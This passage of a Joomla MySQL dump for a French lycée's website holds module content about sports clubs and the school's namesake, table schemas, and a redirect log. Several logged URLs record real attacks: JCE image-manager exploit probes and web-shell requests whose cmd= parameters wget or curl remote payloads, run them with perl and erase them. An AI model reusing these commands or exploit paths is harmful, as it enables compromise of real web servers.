E.P.S.).</p>\r\n<p style="color: #000000;"> </p>\r\n<p style="color: #000000;"> </p>\r\n<p style="color: #000000;"><strong>Volley-ball</strong></p>\r\n<p style="color: #000000;"> </p>\r\n<p style="color: #000000;"><strong>Tennis</strong></p>\r\n<p style="color: #000000;"> </p>\r\n<p style="color: #000000;"><strong>Badminton</strong></p>\r\n<p style="color: #000000;">Activité pratiquée dans un but compétitif (U.N.S.S.) ou de loisir.</p>\r\n<p style="color: #000000;"> </p>\r\n<p style="color: #000000;"> </p>\r\n<p style="color: #000000;"><strong>Musculation</strong></p>\r\n<p style="color: #000000;">Programme individualisé défini en fonction de chaque élève suivant son attente.</p>\r\n<p> </p>', 1, 'Left', 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '0000-00-00 00:00:00', -2, 'mod_custom', 1, 1, '{"prepare_content":"1","backgroundimage":"","layout":"_:default","moduleclass_sfx":"red","cache":"1","cache_time":"900","cachemode":"static"}', 0, '*'),
(38, 'Association sportive', '', '<p>L''association sportive propose aux élèves du lycée, les activités suivantes :</p>\r\n<p><strong>Natation</strong></p>\r\n<p>Participation assidue des élèves inscrits. L''entraînement est basé essentiellement sur un approfondissement de la technique individuelle et une préparation aux différents examens (option bac, concours professorat E.P.S.).</p>\r\n<p><strong>Badminton</strong></p>\r\n<p>Activité pratiquée dans un but compétitif (U.N.S.S.) ou de loisir.</p>\r\n<p><strong>Musculation</strong></p>\r\n<p>Programme individualisé défini en fonction de chaque élève suivant son attente.</p>\r\n<p><strong>Mais aussi</strong></p>\r\n<p>foot en sale, basket ball, tennis de table, Volley-ball, Tennis</p>\r\n<p>Les activités et compétitions ont lieu le mercredi après-midi à partir de 12h30, la natation de 12h30 à 13h30.</p>', 1, 'left', 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '0000-00-00 00:00:00', -2, 'mod_custom', 1, 1, '{"prepare_content":"1","backgroundimage":"","layout":"_:default","moduleclass_sfx":" green","cache":"1","cache_time":"900","cachemode":"static"}', 0, '*'),
(40, 'Multilanguage status', '', '', 1, 'status', 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 0, 'mod_multilangstatus', 3, 1, '{"layout":"_:default","moduleclass_sfx":"","cache":"0"}', 1, '*'),
(41, 'Joomla Version', '', '', 1, 'footer', 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 1, 'mod_version', 3, 1, '{"format":"short","product":"1","layout":"_:default","moduleclass_sfx":"","cache":"0"}', 1, '*'),
(42, 'Liens externes', '', '', 1, 'right', 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '0000-00-00 00:00:00', -2, 'mod_weblinks', 1, 1, '{"catid":"6","count":"5","ordering":"title","direction":"asc","target":"3","description":"0","hits":"0","count_clicks":"0","layout":"_:default","moduleclass_sfx":" orange","cache":"1","cache_time":"900","cachemode":"static"}', 0, '*'),
(43, 'fnhfgj', '', '<p>yufitdj,dtku,yfk,yfkfyhk;hfkyf</p>\r\n<p> </p>\r\n<p><a href="formations/form-pre-bac/47-fse-2012-2013#test">Lien</a></p>', 1, 'left', 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '0000-00-00 00:00:00', -2, 'mod_custom', 1, 1, '{"prepare_content":"1","backgroundimage":"","layout":"_:default","moduleclass_sfx":" green","cache":"1","cache_time":"900","cachemode":"static"}', 0, '*'),
(44, 'Le Mot du Proviseur', '', '<p> </p>\r\n<p>PHOTO DU PROVISEUR</p>\r\n<p> </p>\r\n<p>Discours du proviseur à l''attention de toute personne visitant ce site web.</p>', 4, 'left', 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 1, 'mod_custom', 1, 1, '{"prepare_content":"0","backgroundimage":"","layout":"_:default","moduleclass_sfx":" orange","cache":"1","cache_time":"900","cachemode":"static"}', 0, '*'),
(45, 'Maximilien Sorre', '', '<p style="font-size: 12.16px; line-height: 15.808px;"><strong><img src="files/images/max_sorre.jpg" border="0" alt="" width="151" height="185" /></strong></p>\r\n<p style="font-size: 12.16px; line-height: 15.808px;"><strong>1880 - 1962</strong></p>\r\n<p style="font-size: 12.16px; line-height: 15.808px;">Ancien élève de l''École Normale Supérieure de Saint-Cloud, il devient Docteur ès Lettres en 1913 avec une thèse de Géographie biologique sur les Pyrénées méditerranéennes.</p>\r\n<p style="font-size: 12.16px; line-height: 15.808px;">Professeur de Faculté, recteur de l''académie de Clermont-Ferrand puis de celle d''Aix Marseille, Directeur de l''Enseignement du Premier degré de 1937 à 1940, il enseigne ensuite à l''université de Montpellier puis à la Sorbonne (1941-1948).</p>\r\n<p style="font-size: 12.16px; line-height: 15.808px;">Auteur d''un ouvrage de synthèse sur les Pyrénées (1928), puis sur les migrations des peuples (1955), il a collaboré à la Géographie universelle, en particulier sur le Mexique, l''Amérique Centrale (1934), la Méditerranée et les Péninsules méditerranéennes. Son traité <span style="font-style: italic;">Les fondements de la Géographie humaine</span> fait autorité.</p>', 1, 'left', 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 1, 'mod_custom', 1, 1, '{"prepare_content":"0","backgroundimage":"","layout":"_:default","moduleclass_sfx":" orange","cache":"1","cache_time":"900","cachemode":"static"}', 0, '*'),
(46, 'Coordonnées', '', '<p><strong>LYCÉE MAXIMILIEN SORRE</strong></p>\r\n<p>Téléphone :  01 47 40 49 60</p>\r\n<p>Adresse : 61 avenue du Président Wilson, <span style="font-size: 12.16px; line-height: 1.3em;">94230 CACHAN</span></p>\r\n<p> </p>', 1, 'footer', 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 1, 'mod_custom', 1, 1, '{"prepare_content":"0","backgroundimage":"","layout":"_:default","moduleclass_sfx":"","cache":"1","cache_time":"900","cachemode":"static"}', 0, '*'),
(47, 'En vedette', '', '', 4, 'left', 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 1, 'mod_articles_category', 1, 1, '{"mode":"normal","show_on_article_page":"1","show_front":"only","count":"3","category_filtering_type":"1","catid":["24","25","26"],"show_child_category_articles":"0","levels":"1","author_filtering_type":"1","created_by":[""],"author_alias_filtering_type":"1","created_by_alias":[""],"excluded_articles":"","date_filtering":"off","date_field":"a.created","start_date_range":"","end_date_range":"","relative_date":"30","article_ordering":"a.title","article_ordering_direction":"ASC","article_grouping":"none","article_grouping_direction":"ksort","month_year_format":"F Y","item_heading":"4","link_titles":"1","show_date":"0","show_date_field":"created","show_date_format":"Y-m-d H:i:s","show_category":"0","show_hits":"0","show_author":"0","show_introtext":"0","introtext_limit":"100","show_readmore":"0","show_readmore_title":"1","readmore_limit":"15","layout":"_:default","moduleclass_sfx":" orange","owncache":"1","cache_time":"900"}', 0, '*'),
(48, 'Catégories', '', '', 1, 'left', 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '0000-00-00 00:00:00', -2, 'mod_breadcrumbs', 1, 1, '{"showHere":"1","showHome":"1","homeText":"","showLast":"1","separator":"","layout":"_:default","moduleclass_sfx":" green","cache":"1","cache_time":"900","cachemode":"itemid"}', 0, '*'),
(49, 'Catégories', '', '<p><a href="126-form-pre-bac">PRÉ-BAC</a></p>\r\n<p>BTS</p>\r\n<p>CPGE</p>\r\n<p>AUTRES</p>', 1, 'left', 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '0000-00-00 00:00:00', -2, 'mod_custom', 1, 0, '{"prepare_content":"0","backgroundimage":"","layout":"_:default","moduleclass_sfx":" green","cache":"1","cache_time":"900","cachemode":"static"}', 0, '*'),
(50, 'Organigramme', '', '<p>DIRECTION</p>\r\n<p>PERSONNEL ADMINISTRATIF</p>\r\n<p>PERSONNEL D''ÉDUCATION</p>\r\n<p>PERSONNEL MÉDICO-SOCIAL</p>\r\n<p>PERSONNEL TECHNIQUE</p>\r\n<p>PERSONNEL DE LABORATOIRE</p>\r\n<p>CORPS ENSEIGNANT</p>\r\n<p>DOCUMENTALISTE</p>', 1, 'left', 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 1, 'mod_custom', 1, 0, '{"prepare_content":"0","backgroundimage":"","layout":"_:default","moduleclass_sfx":" green","cache":"1","cache_time":"900","cachemode":"static"}', 0, '*'),
(51, 'moduletest', '', '<p>Test module</p>', 1, 'right', 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 1, 'mod_custom', 1, 1, '{"prepare_content":"1","backgroundimage":"","layout":"_:default","moduleclass_sfx":" orange","cache":"1","cache_time":"900","cachemode":"static"}', 0, '*'),
(52, 'BTS', '', '', 1, 'left', 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 1, 'mod_articles_category', 1, 1, '{"mode":"normal","show_on_article_page":"1","show_front":"show","count":"0","category_filtering_type":"1","catid":["24"],"show_child_category_articles":"0","levels":"1","author_filtering_type":"1","created_by":[""],"author_alias_filtering_type":"1","created_by_alias":[""],"excluded_articles":"","date_filtering":"off","date_field":"a.created","start_date_range":"","end_date_range":"","relative_date":"30","article_ordering":"a.title","article_ordering_direction":"ASC","article_grouping":"none","article_grouping_direction":"ksort","month_year_format":"F Y","item_heading":"2","link_titles":"1","show_date":"0","show_date_field":"created","show_date_format":"Y-m-d H:i:s","show_category":"0","show_hits":"0","show_author":"0","show_introtext":"0","introtext_limit":"100","show_readmore":"0","show_readmore_title":"1","readmore_limit":"15","layout":"_:default","moduleclass_sfx":" green","owncache":"1","cache_time":"900"}', 0, '*'),
(53, 'Cat Formations', '', '', 1, 'left', 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 1, 'mod_menu', 1, 0, '{"menutype":"mainmenu","startLevel":"2","endLevel":"2","showAllChildren":"0","tag_id":"","class_sfx":" green","window_open":"","layout":"_:default","moduleclass_sfx":"","cache":"1","cache_time":"900","cachemode":"itemid"}', 0, '*'),
(54, 'Test derniers articles', '', '', 1, 'bottom', 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 1, 'mod_articles_latest', 1, 1, '{"catid":[""],"count":"5","show_featured":"","ordering":"c_dsc","user_id":"0","layout":"_:default","moduleclass_sfx":" orange","cache":"1","cache_time":"900","cachemode":"static"}', 0, '*'),
(55, 'Sous Categ', '', '', 1, 'left', 390, '2016-06-21 14:43:11', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 1, 'mod_articles_categories', 1, 0, '{"parent":"19","show_description":"0","show_children":"1","count":"0","maxlevel":"0","layout":"_:default","item_heading":"4","moduleclass_sfx":" orange","owncache":"1","cache_time":"900"}', 0, '*'),
(56, 'Actus AS', '', '', 1, 'bottom', 390, '2016-06-22 10:48:27', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 1, 'mod_articles_category', 1, 1, '{"mode":"normal","show_on_article_page":"1","show_front":"show","count":"5","category_filtering_type":"1","catid":["21"],"show_child_category_articles":"0","levels":"1","author_filtering_type":"1","created_by":[""],"author_alias_filtering_type":"1","created_by_alias":[""],"excluded_articles":"","date_filtering":"off","date_field":"a.created","start_date_range":"","end_date_range":"","relative_date":"30","article_ordering":"a.title","article_ordering_direction":"ASC","article_grouping":"none","article_grouping_direction":"ksort","month_year_format":"F Y","item_heading":"4","link_titles":"1","show_date":"0","show_date_field":"created","show_date_format":"Y-m-d H:i:s","show_category":"0","show_hits":"0","show_author":"0","show_introtext":"1","introtext_limit":"100","show_readmore":"1","show_readmore_title":"1","readmore_limit":"15","layout":"_:default","moduleclass_sfx":" orange","owncache":"1","cache_time":"900"}', 0, '*'),
(57, 'Liste des AS', '', '', 1, 'left', 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 1, 'mod_articles_categories', 1, 1, '{"parent":"30","show_description":"0","show_children":"1","count":"0","maxlevel":"0","layout":"_:default","item_heading":"4","moduleclass_sfx":" green","owncache":"1","cache_time":"900"}', 0, '*'),
(58, 'Slider Lycée', '', '', 1, 'slider', 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 1, 'mod_banners', 1, 1, '{"target":"1","count":"5","cid":"0","catid":["51"],"tag_search":"0","ordering":"0","header_text":"","footer_text":"","layout":"_:default","moduleclass_sfx":"","cache":"1","cache_time":"900"}', 0, '*');

-- --------------------------------------------------------

--
-- Table structure for table `jos_modules_menu`
--

CREATE TABLE IF NOT EXISTS `jos_modules_menu` (
  `moduleid` int(11) NOT NULL DEFAULT '0',
  `menuid` int(11) NOT NULL DEFAULT '0',
  PRIMARY KEY (`moduleid`,`menuid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

--
-- Dumping data for table `jos_modules_menu`
--

INSERT INTO `jos_modules_menu` (`moduleid`, `menuid`) VALUES
(1, 0),
(2, 0),
(3, 0),
(4, 0),
(6, 0),
(7, 0),
(8, 0),
(9, 0),
(10, 0),
(12, 0),
(13, 0),
(14, 0),
(15, 0),
(16, 108),
(16, 109),
(16, 110),
(17, 0),
(18, 101),
(19, 0),
(20, 0),
(21, 102),
(21, 111),
(21, 112),
(21, 113),
(21, 114),
(22, 103),
(23, 104),
(24, 105),
(25, 106),
(26, 106),
(27, 106),
(28, 102),
(29, 103),
(30, 104),
(31, 105),
(32, 106),
(33, 107),
(33, 108),
(33, 109),
(33, 110),
(35, 116),
(36, 116),
(37, 117),
(38, 117),
(39, 106),
(40, 0),
(41, 0),
(43, 125),
(43, 126),
(44, 104),
(44, 107),
(44, 108),
(44, 109),
(44, 110),
(44, 116),
(44, 134),
(45, 128),
(46, 0),
(47, 103),
(48, 103),
(48, 107),
(48, 108),
(48, 109),
(48, 110),
(48, 116),
(49, 103),
(50, 129),
(52, 131),
(53, 103),
(54, 134),
(55, 119),
(56, 134),
(57, 134),
(58, 104);

-- --------------------------------------------------------

--
-- Table structure for table `jos_newsfeeds`
--

CREATE TABLE IF NOT EXISTS `jos_newsfeeds` (
  `catid` int(11) NOT NULL DEFAULT '0',
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(100) NOT NULL DEFAULT '',
  `alias` varchar(255) CHARACTER SET utf8 COLLATE utf8_bin NOT NULL DEFAULT '',
  `link` varchar(200) NOT NULL DEFAULT '',
  `filename` varchar(200) DEFAULT NULL,
  `published` tinyint(1) NOT NULL DEFAULT '0',
  `numarticles` int(10) unsigned NOT NULL DEFAULT '1',
  `cache_time` int(10) unsigned NOT NULL DEFAULT '3600',
  `checked_out` int(10) unsigned NOT NULL DEFAULT '0',
  `checked_out_time` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `ordering` int(11) NOT NULL DEFAULT '0',
  `rtl` tinyint(4) NOT NULL DEFAULT '0',
  `access` int(10) unsigned DEFAULT NULL,
  `language` char(7) NOT NULL DEFAULT '',
  `params` text NOT NULL,
  `created` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `created_by` int(10) unsigned NOT NULL DEFAULT '0',
  `created_by_alias` varchar(255) NOT NULL DEFAULT '',
  `modified` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `modified_by` int(10) unsigned NOT NULL DEFAULT '0',
  `metakey` text NOT NULL,
  `metadesc` text NOT NULL,
  `metadata` text NOT NULL,
  `xreference` varchar(50) NOT NULL COMMENT 'A reference to enable linkages to external data sets.',
  `publish_up` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `publish_down` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  PRIMARY KEY (`id`),
  KEY `idx_access` (`access`),
  KEY `idx_checkout` (`checked_out`),
  KEY `idx_state` (`published`),
  KEY `idx_catid` (`catid`),
  KEY `idx_createdby` (`created_by`),
  KEY `idx_language` (`language`),
  KEY `idx_xreference` (`xreference`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- Table structure for table `jos_overrider`
--

CREATE TABLE IF NOT EXISTS `jos_overrider` (
  `id` int(10) NOT NULL AUTO_INCREMENT COMMENT 'Primary Key',
  `constant` varchar(255) NOT NULL,
  `string` text NOT NULL,
  `file` varchar(255) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- Table structure for table `jos_redirect_links`
--

CREATE TABLE IF NOT EXISTS `jos_redirect_links` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `old_url` varchar(255) DEFAULT NULL,
  `new_url` varchar(255) DEFAULT NULL,
  `referer` varchar(150) NOT NULL,
  `comment` varchar(255) NOT NULL,
  `hits` int(10) unsigned NOT NULL DEFAULT '0',
  `published` tinyint(4) NOT NULL,
  `created_date` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `modified_date` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  PRIMARY KEY (`id`),
  UNIQUE KEY `idx_link_old` (`old_url`),
  KEY `idx_link_modifed` (`modified_date`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=293 ;

--
-- Dumping data for table `jos_redirect_links`
--

INSERT INTO `jos_redirect_links` (`id`, `old_url`, `new_url`, `referer`, `comment`, `hits`, `published`, `created_date`, `modified_date`) VALUES
(1, 'http://localhost/tm/theme777/index.php/index.php', '', 'http://localhost/tm/theme777/index.php/locations', '', 0, 0, '2011-08-02 16:19:16', '0000-00-00 00:00:00'),
(2, 'http://lyceemaximiliensorre.fr/www.lyceemaximiliensorre.fr/support', '', 'http://lyceemaximiliensorre.fr/', '', 1, 0, '2013-10-08 17:31:48', '0000-00-00 00:00:00'),
(3, 'http://www.lyceemaximiliensorre.fr/index.php/component/content/category/www.admission-postbac.org', '', '', '', 128, 0, '2013-10-10 07:37:09', '0000-00-00 00:00:00'),
(4, 'http://www.lyceemaximiliensorre.fr/portefeuilleSIO', '', '', '', 20, 0, '2013-10-10 07:42:59', '0000-00-00 00:00:00'),
(5, 'http://www.lyceemaximiliensorre.fr/portefeuilleSIO/', '', '', '', 5, 0, '2013-10-10 07:43:39', '0000-00-00 00:00:00'),
(6, 'http://lyceemaximiliensorre.fr/component/content/category/8-sample-pages/lycee', '', '', '', 9, 0, '2013-10-13 08:59:11', '0000-00-00 00:00:00'),
(7, 'http://lyceemaximiliensorre.fr/component/content/category/21-baccalaureats', '', '', '', 2, 0, '2013-10-13 17:25:46', '0000-00-00 00:00:00'),
(8, 'http://lyceemaximiliensorre.fr/component/content/category/23-etudes-post-bts', '', '', '', 2, 0, '2013-10-13 17:57:12', '0000-00-00 00:00:00'),
(9, 'http://lyceemaximiliensorre.fr/component/content/category/22-etudes-post-bac', '', '', '', 3, 0, '2013-10-13 19:35:20', '0000-00-00 00:00:00'),
(10, 'http://lyceemaximiliensorre.fr/component/content/category/www.admission-postbac.org  ', '', '', '', 2, 0, '2013-10-13 20:25:43', '0000-00-00 00:00:00'),
(11, 'http://www.lyceemaximiliensorre.fr/component/content/category/8-sample-pages/lycee', '', '', '', 5, 0, '2013-10-14 22:15:30', '0000-00-00 00:00:00'),
(12, 'http://www.lyceemaximiliensorre.fr/faq.php', '', 'http://www.lyceemaximiliensorre.fr/faq.php', '', 5, 0, '2013-11-01 09:58:36', '0000-00-00 00:00:00'),
(13, 'http://www.lyceemaximiliensorre.fr/index.php?option=com_users&task=registration.activate&token=74f5e64958af72328303756df6c8f281', '', '', '', 1, 0, '2013-11-10 20:33:02', '0000-00-00 00:00:00'),
(14, 'http://www.lyceemaximiliensorre.fr/index.php/img.caption', '', 'http://www.lyceemaximiliensorre.fr/index.php/lycee', '', 1, 0, '2013-11-11 00:40:29', '0000-00-00 00:00:00'),
(15, 'http://www.lyceemaximiliensorre.fr/index.php/actualites/img.caption', '', 'http://www.lyceemaximiliensorre.fr/index.php/actualites/47-fse-2012-2013', '', 1, 0, '2013-11-11 00:45:34', '0000-00-00 00:00:00'),
(16, 'http://www.lyceemaximiliensorre.fr/application/json', '', 'http://www.lyceemaximiliensorre.fr/media/system/js/mootools-core.js', '', 1, 0, '2013-11-11 00:49:19', '0000-00-00 00:00:00'),
(17, 'http://www.lyceemaximiliensorre.fr/application/x-shockwave-flash', '', 'http://www.lyceemaximiliensorre.fr/media/system/js/mootools-core.js', '', 1, 0, '2013-11-11 00:49:54', '0000-00-00 00:00:00'),
(18, 'http://www.lyceemaximiliensorre.fr/12/31/1999', '', 'http://www.lyceemaximiliensorre.fr/media/system/js/mootools-more.js', '', 1, 0, '2013-11-11 00:53:17', '0000-00-00 00:00:00'),
(19, 'http://www.lyceemaximiliensorre.fr/text/css', '', 'http://www.lyceemaximiliensorre.fr/media/system/js/mootools-more.js', '', 1, 0, '2013-11-11 00:54:24', '0000-00-00 00:00:00'),
(20, 'http://www.lyceemaximiliensorre.fr/31/12/1999', '', 'http://www.lyceemaximiliensorre.fr/media/system/js/mootools-more.js', '', 1, 0, '2013-11-11 00:54:32', '0000-00-00 00:00:00'),
(21, 'http://www.lyceemaximiliensorre.fr/31/11/1999', '', 'http://www.lyceemaximiliensorre.fr/media/system/js/mootools-more.js', '', 1, 0, '2013-11-11 00:56:56', '0000-00-00 00:00:00'),
(22, 'http://www.lyceemaximiliensorre.fr/12/31/2009', '', 'http://www.lyceemaximiliensorre.fr/media/system/js/mootools-more.js', '', 1, 0, '2013-11-11 00:59:58', '0000-00-00 00:00:00'),
(23, 'http://www.lyceemaximiliensorre.fr/text/xml', '', 'http://www.lyceemaximiliensorre.fr/templates/theme777/scripts/jquery-1.5.js', '', 1, 0, '2013-11-11 01:06:57', '0000-00-00 00:00:00'),
(24, 'http://www.lyceemaximiliensorre.fr/application/x-www-form-urlencoded', '', 'http://www.lyceemaximiliensorre.fr/templates/theme777/scripts/jquery-1.5.js', '', 1, 0, '2013-11-11 01:08:01', '0000-00-00 00:00:00'),
(25, 'http://www.lyceemaximiliensorre.fr/text/html', '', 'http://www.lyceemaximiliensorre.fr/templates/theme777/scripts/jquery-1.5.js', '', 1, 0, '2013-11-11 01:08:32', '0000-00-00 00:00:00'),
(26, 'http://www.lyceemaximiliensorre.fr/text/plain', '', 'http://www.lyceemaximiliensorre.fr/templates/theme777/scripts/jquery-1.5.js', '', 1, 0, '2013-11-11 01:09:11', '0000-00-00 00:00:00'),
(27, 'http://www.lyceemaximiliensorre.fr/support/text/xml', '', 'http://www.lyceemaximiliensorre.fr/support/js/jquery-1.7.2.min.js', '', 1, 0, '2013-11-11 01:54:32', '0000-00-00 00:00:00'),
(28, 'http://lyceemaximiliensorre.fr/support/s', '', '', '', 1, 0, '2013-11-13 15:43:08', '0000-00-00 00:00:00'),
(29, 'http://www.lyceemaximiliensorre.fr/index.php/component/users/?view=remind&amp;sa=U&amp;ei=1emIUtvkLKbw4gTrZw&amp;ved=0CMICEBYwXDhk&amp;usg=AFQjCNG3qi6gkCYEeWrzh4pYIoGCB0I0zw/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&version=15', '', '', '', 1, 0, '2013-11-17 16:10:20', '0000-00-00 00:00:00'),
(30, 'http://www.lyceemaximiliensorre.fr/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&version=1576&cid=20', '', '', '', 7, 0, '2013-11-17 16:10:21', '0000-00-00 00:00:00'),
(31, 'http://www.lyceemaximiliensorre.fr/index.php/component/users/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&version=1576&cid=20', '', '', '', 6, 0, '2013-11-17 16:10:21', '0000-00-00 00:00:00'),
(32, 'http://www.lyceemaximiliensorre.fr//images/stories/underdog.php?rf', '', '', '', 1, 0, '2013-11-17 16:10:21', '0000-00-00 00:00:00'),
(33, 'http://www.lyceemaximiliensorre.fr//images/stories/underdog.php?cmd=cd /tmp ;wget http://jce.altervista.org/bug.log ; perl bug.log ; rm -rf bug.log', '', '', '', 1, 0, '2013-11-17 16:10:22', '0000-00-00 00:00:00'),
(34, 'http://www.lyceemaximiliensorre.fr//images/stories/underdog.php?cmd=wget http://jce.altervista.org/componentz.zip ; unzip componentz.zip ; rm -rf componentz.zip', '', '', '', 1, 0, '2013-11-17 16:10:22', '0000-00-00 00:00:00'),
(35, 'http://www.lyceemaximiliensorre.fr/images/stories/stories.php?smtp', '', '', '', 1, 0, '2013-11-23 14:40:08', '0000-00-00 00:00:00'),
(36, 'http://www.lyceemaximiliensorre.fr/images/stories/stories.php?cmd=lwp-download http://tim15.com/file.tar.gz;wget http://tim15.com/file.tar.gz;curl -O http://tim15.com/file.tar.gz;tar zxvf file.tar.gz;rm -fr *.gz;rm -fr *.tar.*', '', '', '', 1, 0, '2013-11-23 14:40:08', '0000-00-00 00:00:00'),
(37, 'http://www.lyceemaximiliensorre.fr/images/stories/robot.php', '', '', '', 1, 0, '2013-11-23 14:40:08', '0000-00-00 00:00:00'),
(38, 'http://www.lyceemaximiliensorre.fr/images/stories/metri.php', '', '', '', 1, 0, '2013-11-23 14:40:12', '0000-00-00 00:00:00'),
(39, 'http://www.lyceemaximiliensorre.fr/images/stories/mey.php', '', '', '', 1, 0, '2013-11-23 14:40:15', '0000-00-00 00:00:00'),
(40, 'http://lyceemaximiliensorre.fr/index.php/component/banners/click/1/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&version=1576&cid=20', '', '', '', 2, 0, '2013-11-27 19:41:30', '0000-00-00 00:00:00'),
(41, 'http://lyceemaximiliensorre.fr/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&version=1576&cid=20', '', '', '', 4, 0, '2013-11-27 19:41:31', '0000-00-00 00:00:00'),
(42, 'http://lyceemaximiliensorre.fr//images/stories/k4l0nk.php?rf', '', '', '', 2, 0, '2013-11-27 19:41:36', '0000-00-00 00:00:00'),
(43, 'http://lyceemaximiliensorre.fr//images/stories/food/footer.php?clone', '', '', '', 2, 0, '2013-11-27 19:41:37', '0000-00-00 00:00:00'),
(44, 'http://lyceemaximiliensorre.fr/index.php/component/banners/click/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&version=1576&cid=20', '', '', '', 1, 0, '2013-11-27 19:42:10', '0000-00-00 00:00:00'),
(45, 'http://www.lyceemaximiliensorre.fr//index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form&cid=20&6bc427c8a7981f4fe1f5ac65c1246b5f=cf6dd3cf1923c950586d0dd595c8e20b', '', '', '', 1, 0, '2013-12-02 04:18:45', '0000-00-00 00:00:00'),
(46, 'http://www.lyceemaximiliensorre.fr/index.php/component/users//index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form&cid=20&6bc427c8a7981f4fe1f5ac65c1246b5f=cf6dd3cf1923c950586d0dd595c8e20b', '', '', '', 1, 0, '2013-12-02 04:18:45', '0000-00-00 00:00:00'),
(47, 'http://lyceemaximiliensorre.fr/scp/support', '', '', '', 1, 0, '2013-12-13 18:20:06', '0000-00-00 00:00:00'),
(48, 'http://www.lyceemaximiliensorre.fr/Porteuillesio/', '', '', '', 3, 0, '2013-12-16 16:16:09', '0000-00-00 00:00:00'),
(49, 'http://www.lyceemaximiliensorre.fr/portefeuilleSIO/index.php', '', '', '', 3, 0, '2013-12-19 10:04:35', '0000-00-00 00:00:00'),
(50, 'http://lyceemaximiliensorre.fr//core/lib/php-ofc-library/ofc_upload_image.php?name=barcode.php', '', '', '', 1, 0, '2013-12-24 14:21:37', '0000-00-00 00:00:00'),
(51, 'http://lyceemaximiliensorre.fr/support//core/lib/php-ofc-library/ofc_upload_image.php?name=barcode.php', '', '', '', 1, 0, '2013-12-24 14:21:38', '0000-00-00 00:00:00'),
(52, 'http://www.lyceemaximiliensorre.fr/equipe-direction', '', 'http://www.lyceemaximiliensorre.fr/cdi', '', 36, 0, '2014-01-05 23:37:00', '0000-00-00 00:00:00'),
(53, 'http://lyceemaximiliensorre.fr/equipe-direction', '', '', '', 38, 0, '2014-01-09 13:53:17', '0000-00-00 00:00:00'),
(54, 'http://www.lyceemaximiliensorre.fr/portefeuilsio/', '', '', '', 1, 0, '2014-01-10 14:24:17', '0000-00-00 00:00:00'),
(55, 'http://lyceemaximiliensorre.fr/portefeuillesio/index.php', '', '', '', 2, 0, '2014-01-15 00:30:37', '0000-00-00 00:00:00'),
(56, 'http://lyceemaximiliensorre.fr/PortefeuilleSio', '', '', '', 10, 0, '2014-01-23 09:49:25', '0000-00-00 00:00:00'),
(57, 'http://www.lyceemaximiliensorre.fr/portefeuilleiso', '', '', '', 1, 0, '2014-01-24 12:52:30', '0000-00-00 00:00:00'),
(58, 'http://lyceemaximiliensorre.fr/support/view.php+++++++++++++++++++++++++++++++++++++++Result:+', '', 'http://lyceemaximiliensorre.fr/support/view.php+++++++++++++++++++++++++++++++++++++++Result:+%F4%EE%F0%F3%EC+%ED%E5+%ED%E0%E9%E4%E5%ED+/+%ED%E5+%F3%E', '', 1, 0, '2014-01-26 08:47:28', '0000-00-00 00:00:00'),
(59, 'http://lyceemaximiliensorre.fr/P', '', '', '', 1, 0, '2014-01-31 12:05:29', '0000-00-00 00:00:00'),
(60, 'http://www.lyceemaximiliensorre.fr/images/stories/config.inc.php?rf', '', '', '', 1, 0, '2014-01-31 18:53:53', '0000-00-00 00:00:00'),
(61, 'http://www.lyceemaximiliensorre.fr/PortefeuilleSIO/testdb', '', '', '', 1, 0, '2014-02-02 22:51:22', '0000-00-00 00:00:00'),
(62, 'http://www.lyceemaximiliensorre.fr/PortefeuilleSIO/testdb/', '', '', '', 2, 0, '2014-02-02 22:51:31', '0000-00-00 00:00:00'),
